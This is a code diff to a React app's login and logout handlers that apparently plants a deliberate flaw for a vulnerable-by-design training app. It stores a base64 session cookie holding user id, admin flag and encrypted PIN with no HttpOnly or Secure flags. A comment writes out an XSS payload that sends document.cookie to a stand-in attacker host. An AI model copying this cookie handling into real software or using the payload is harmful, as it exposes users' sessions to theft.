@@ -23,6 +23,27 @@ export default function App() {
 
   function handleLogin(userData) {
     localStorage.setItem(STORAGE_KEY, JSON.stringify(userData));
+
+    // ======================================================================
+    // VULNERABILITY: Session cookie set WITHOUT the HttpOnly flag.
+    // ----------------------------------------------------------------------
+    // A "session token" is written from client-side JavaScript, which means
+    // it can never be HttpOnly and is fully readable via `document.cookie`.
+    // Combined with the stored-XSS sink in the feed, an injected
+    //     <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
+    // can exfiltrate this token to an attacker's webhook.
+    // ======================================================================
+    const sessionToken = btoa(
+      JSON.stringify({
+        uid: userData.id,
+        username: userData.username,
+        is_admin: userData.is_admin,
+        pin: userData.encrypted_pin,
+      })
+    );
+    // No HttpOnly (impossible from JS), no Secure — deliberately stealable.
+    document.cookie = `session=${sessionToken}; path=/; SameSite=Lax; max-age=86400`;
+
     setUser(userData);
   }
 
@@ -32,6 +53,7 @@ export default function App() {
 
   function handleLogout() {
     localStorage.removeItem(STORAGE_KEY);
+    document.cookie = "session=; path=/; max-age=0";
     setUser(null);
   }
 
